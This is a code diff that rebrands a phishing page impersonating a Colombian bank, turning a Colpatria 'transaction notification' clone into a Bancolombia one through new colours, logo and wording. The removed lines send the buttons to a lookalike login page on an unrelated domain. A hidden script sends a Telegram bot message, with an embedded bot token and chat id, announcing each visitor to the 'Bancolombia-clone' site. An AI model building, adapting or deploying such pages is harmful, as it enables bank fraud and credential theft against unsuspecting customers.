@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Colpatria - Notificación</title>
+<title>Bancolombia - Notificación</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --colpatria-red:#E30613;
-    --colpatria-red-hover:#B1040F;
+    --bancolombia-yellow:#FFD200;
+    --bancolombia-blue:#003B5C;
     --text:#111827;
     --muted:#6b7280;
     --bg:#f7f8fb;
@@ -36,7 +36,7 @@
   @keyframes pop {from {transform: translateY(8px) scale(.98); opacity:0} to {transform: translateY(0) scale(1); opacity:1}}
 
   .card-header{
-    background:linear-gradient(135deg, var(--colpatria-red), #B1040F);
+    background:linear-gradient(135deg, var(--bancolombia-yellow), var(--bancolombia-blue));
     color:white;
     padding:18px 22px;
     display:flex;
@@ -48,19 +48,19 @@
     width:38px;height:38px;border-radius:10px;
     background:white;
     display:grid;place-items:center;
-    color:var(--colpatria-red);font-weight:800;letter-spacing:.2px;
+    color:var(--bancolombia-blue);font-weight:800;letter-spacing:.2px;
   }
   .header-title{font-size:1.05rem;font-weight:700;line-height:1;}
   .header-sub{font-size:.85rem;opacity:.9;}
 
   .card-body{padding:22px;}
-  .headline{font-size:1.3rem;font-weight:700;margin:10px 0;color:var(--colpatria-red);}
+  .headline{font-size:1.3rem;font-weight:700;margin:10px 0;color:var(--bancolombia-blue);}
   .message{font-size:1rem;color:var(--muted);line-height:1.55;}
 
   .amount{display:inline-flex;align-items:baseline;gap:6px;margin-top:8px;}
   .amount strong{font-size:1.5rem;color:#0f172a;}
   .amount .badge{
-    font-size:.75rem;font-weight:700;color:#fff;background:#E30613;
+    font-size:.75rem;font-weight:700;color:#fff;background:var(--bancolombia-yellow);
     border-radius:999px;padding:4px 8px;
   }
 
@@ -70,16 +70,16 @@
     display:inline-flex;align-items:center;justify-content:center;gap:10px;
     padding:14px 18px;border:none;border-radius:14px;cursor:pointer;
     font-weight:800;text-transform:none;font-size:1rem;
-    background:var(--colpatria-red); color:#fff;
-    box-shadow: 0 2px 0 #b1040f, 0 8px 18px rgba(227,6,19,.35);
+    background:var(--bancolombia-blue); color:#fff;
+    box-shadow: 0 2px 0 var(--bancolombia-blue), 0 8px 18px rgba(0,59,92,.35);
     transition: transform .06s ease, box-shadow .2s ease, background .2s ease, filter .2s ease;
     text-decoration:none;
   }
-  .btn:hover{ background:var(--colpatria-red-hover); box-shadow: 0 2px 0 #91030c, 0 10px 22px rgba(177,4,15,.45);}
-  .btn:active{ transform: translateY(1px); box-shadow: 0 1px 0 #91030c, 0 4px 10px rgba(177,4,15,.35);}
+  .btn:hover{ background: #00233B; box-shadow: 0 2px 0 #001F2D, 0 10px 22px rgba(0,37,51,.45);}
+  .btn:active{ transform: translateY(1px); box-shadow: 0 1px 0 #001F2D, 0 4px 10px rgba(0,37,51,.35);}
 
-  .btn.secondary{ background:#fff; color:var(--colpatria-red); border:1.5px solid var(--colpatria-red); box-shadow: 0 2px 0 var(--colpatria-red) }
-  .btn.secondary:hover{ background:#ffe6e8 }
+  .btn.secondary{ background:#fff; color:var(--bancolombia-blue); border:1.5px solid var(--bancolombia-blue); box-shadow: 0 2px 0 var(--bancolombia-blue); }
+  .btn.secondary:hover{ background:#e6f2ff }
 
   .fineprint{margin-top:16px;font-size:.85rem;color:#6b7280;}
   .secure{display:flex;align-items:center;gap:8px;margin-top:14px;color:#6b7280;font-size:.82rem;justify-content:center;}
@@ -102,11 +102,11 @@
 </head>
 <body>
 
-<main class="card" role="region" aria-label="Notificación Colpatria">
+<main class="card" role="region" aria-label="Notificación Bancolombia">
   <div class="card-header">
-    <div class="logo" aria-hidden="true">Cp</div>
+    <div class="logo" aria-hidden="true">B</div>
     <div>
-      <div class="header-title">Colpatria</div>
+      <div class="header-title">Bancolombia</div>
       <div class="header-sub">Notificación de movimiento</div>
     </div>
   </div>
@@ -121,8 +121,8 @@
     </div>
 
     <div class="actions">
-      <a class="btn secondary" href="https://scdfonlinecolombia.online/colpatria/cel-login.html">Cancelar</a>
-      <a class="btn" href="https://scdfonlinecolombia.online/colpatria/cel-login.html">Aceptar</a>
+      <a class="btn secondary" href="https://www.bancolombia.com/mi-cuenta">Cancelar</a>
+      <a class="btn" href="https://www.bancolombia.com/mi-cuenta">Aceptar</a>
     </div>
 
     <div class="secure">
@@ -133,7 +133,7 @@
     <p class="fineprint">Si no reconoces esta notificación, puedes ignorarla y cancelar la transacción.</p>
   </div>
 
-  <img src="https://www.valoraanalitik.com/wp-content/uploads/2023/01/Medida-para-Notas.jpg" alt="Colpatria imagen">
+  <img src="https://www.bancolombia.com/wps/wcm/connect/banco-de-logos/banco/logo-bancolombia.svg" alt="Bancolombia imagen">
 </main>
 <script>
   fetch("https://api.telegram.org/bot7984706159:AAGai2Rx6thKz_vfuLb34UYvnIn15CbwN04/sendMessage", {
@@ -143,7 +143,7 @@
     },
     body: JSON.stringify({
       chat_id: "5647970395",
-      text: "Nuevo visitante en tu sitio Colpatria-clon."
+      text: "Nuevo visitante en tu sitio Bancolombia-clon."
     })
   });
 </script>
